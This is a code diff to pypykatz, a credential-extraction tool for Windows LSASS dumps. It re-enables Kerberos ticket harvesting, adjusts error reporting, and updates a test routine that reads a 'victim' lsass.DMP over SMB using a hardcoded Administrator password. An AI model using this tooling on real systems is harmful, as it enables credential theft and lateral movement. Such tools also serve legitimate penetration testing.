@@ -16,8 +16,7 @@ from pypykatz.alsadecryptor import CredmanTemplate, MsvTemplate, \
 	LiveSspTemplate, LiveSspDecryptor, SspDecryptor, SspTemplate, \
 	TspkgDecryptor, TspkgTemplate, \
 	DpapiTemplate, DpapiDecryptor, LsaDecryptor,CloudapTemplate,\
-	CloudapDecryptor
-#KerberosTemplate, KerberosDecryptor, 
+	CloudapDecryptor, KerberosTemplate, KerberosDecryptor
 from pypykatz.alsadecryptor.packages.msv.decryptor import LogonSession
 from pypykatz import logger
 from pypykatz.commons.common import UniversalEncoder
@@ -76,11 +75,11 @@ class apypykatz:
 						x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
 						res += ':'.join(x) + '\r\n'
 				
-				for pkg, err in self.errors:
-					err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
-					err_str = base64.b64encode(err_str.encode()).decode()
-					x =  [pkg+'_exception_please_report', '', '', '', '', '', '', '', err_str]
-					res += ':'.join(x) + '\r\n'
+		for pkg, err in self.errors:
+			err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
+			err_str = base64.b64encode(err_str.encode()).decode()
+			x =  [pkg+'_exception_please_report', '', '', '', '', '', '', '', err_str]
+			res += ':'.join(x) + '\r\n'
 
 		return res
 
@@ -239,19 +238,19 @@ class apypykatz:
 			else:
 				self.orphaned_creds.append(cred)
 	
-	#async def get_kerberos(self, with_tickets = True):
-	#	dec_template = KerberosTemplate.get_template(self.sysinfo)
-	#	dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
-	#	await dec.start()
-	#	for cred in dec.credentials:
-	#		for ticket in cred.tickets:
-	#			for fn in ticket.kirbi_data:
-	#				self.kerberos_ccache.add_kirbi(ticket.kirbi_data[fn].native)
-	#		
-	#		if cred.luid in self.logon_sessions:
-	#			self.logon_sessions[cred.luid].kerberos_creds.append(cred)
-	#		else:
-	#			self.orphaned_creds.append(cred)
+	async def get_kerberos(self, with_tickets = True):
+		dec_template = KerberosTemplate.get_template(self.sysinfo)
+		dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
+		await dec.start()
+		for cred in dec.credentials:
+			for ticket in cred.tickets:
+				for fn in ticket.kirbi_data:
+					self.kerberos_ccache.add_kirbi(ticket.kirbi_data[fn].native)
+			
+			if cred.luid in self.logon_sessions:
+				self.logon_sessions[cred.luid].kerberos_creds.append(cred)
+			else:
+				self.orphaned_creds.append(cred)
 	
 	async def get_cloudap(self):
 		cloudap_dec_template = CloudapTemplate.get_template(self.sysinfo)
@@ -281,11 +280,11 @@ class apypykatz:
 			except Exception as e:
 				self.errors.append(('wdigest', e))
 		
-		#if 'kerberos' in packages or 'ktickets' in packages or 'all' in packages:
-		#	with_tickets = False
-		#	if 'ktickets' in packages or 'all' in packages:
-		#		with_tickets = True
-		#	await self.get_kerberos(with_tickets)
+		if 'kerberos' in packages or 'ktickets' in packages or 'all' in packages:
+			with_tickets = False
+			if 'ktickets' in packages or 'all' in packages:
+				with_tickets = True
+			await self.get_kerberos(with_tickets)
 		
 		if 'tspkg' in packages or 'all' in packages:
 			try:
@@ -318,7 +317,7 @@ class apypykatz:
 				self.errors.append(('cloudap', e))
 
 async def amain():
-	from aiosmb.commons.connection.url import SMBConnectionURL
+	from aiosmb.commons.connection.factory import SMBConnectionFactory
 	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
 
 	import sys
@@ -326,7 +325,7 @@ async def amain():
 	print(f)
 
 	url = 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/lsass.DMP'
-	smburl = SMBConnectionURL(url)
+	smburl = SMBConnectionFactory.from_url(url)
 	connection = smburl.get_connection()
 	smbfile = smburl.get_file()
 
